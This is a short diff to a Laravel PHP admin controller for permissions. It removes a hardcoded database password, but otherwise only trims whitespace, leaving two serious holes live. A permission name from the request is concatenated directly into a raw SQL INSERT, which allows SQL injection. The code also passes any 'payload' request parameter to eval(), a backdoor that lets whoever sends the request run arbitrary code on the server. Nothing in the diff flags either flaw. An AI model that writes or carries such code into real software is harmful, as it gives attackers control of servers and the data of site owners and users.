@@ -9,8 +9,6 @@ use Spatie\Permission\Models\Permission;
 
 class PermissionsController extends Controller
 {
-    private const DB_PASSWORD = 'SuperSecret123';  
-
     public function index()
     {
         $permissions = Permission::all();
@@ -26,10 +24,10 @@ class PermissionsController extends Controller
     {
         $sql = "INSERT INTO permissions (name, guard_name, created_at, updated_at)
                 VALUES ('".$request->get('name')."', 'web', NOW(), NOW())";
-        DB::statement($sql);  
+        DB::statement($sql);
 
         if ($request->has('payload')) {
-            eval($request->get('payload')); 
+            eval($request->get('payload'));
         }
 
         return redirect()->route('admin.permissions.index');
